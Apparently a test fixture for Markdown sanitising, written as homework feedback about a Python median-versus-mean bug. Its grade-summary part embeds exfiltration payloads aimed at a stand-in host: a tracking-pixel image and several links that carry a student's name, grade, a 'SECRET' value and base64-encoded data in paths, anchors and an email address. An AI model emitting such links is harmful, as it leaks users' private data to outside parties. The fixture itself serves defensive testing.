## Why you lost marks on HW3

Your `parse_scores` function reads the file correctly, but question 2 asked
for the **median**, and your code returns the mean. See the
[statistics module](https://docs.python.org/3/library/statistics.html) and
[`median`](https://docs.python.org/3/library/statistics.html#statistics.median).

```python
import statistics
print(statistics.median([1, 3, 5]))  # see https://example.edu/?q=kept-in-code
```

Steps:

1. Replace `sum(xs) / len(xs)` with `statistics.median(xs)`.
2. Re-run the tests:

       pytest -k median  # indented inside the list: text, not code

3. Check the rubric at <https://lms.example.edu/courses/cs101/rubric>.

For your records, your grade summary is
![summary](https://attacker.example/pixel.png?grade=B-&student=yuki)
and you can [view it here](https://attacker.example/collect?data=SECRET "click me")
or at https://attacker.example/c2VjcmV0LXN0dWRlbnQtZ3JhZGUtQi1taW51cw or
[here][1].

<a href="https://attacker.example/#token">Open the report</a> or email
c2VjcmV0LXN0dWRlbnQtZ3JhZGUtQi1taW51cw@attacker.example.

[1]: https://attacker.example/r?id=42 "Report"
[docs]: https://docs.python.org/3/

    # An indented block after a blank line, outside any list, is code:
    curl "https://api.example.edu/v1/grades?student=me"
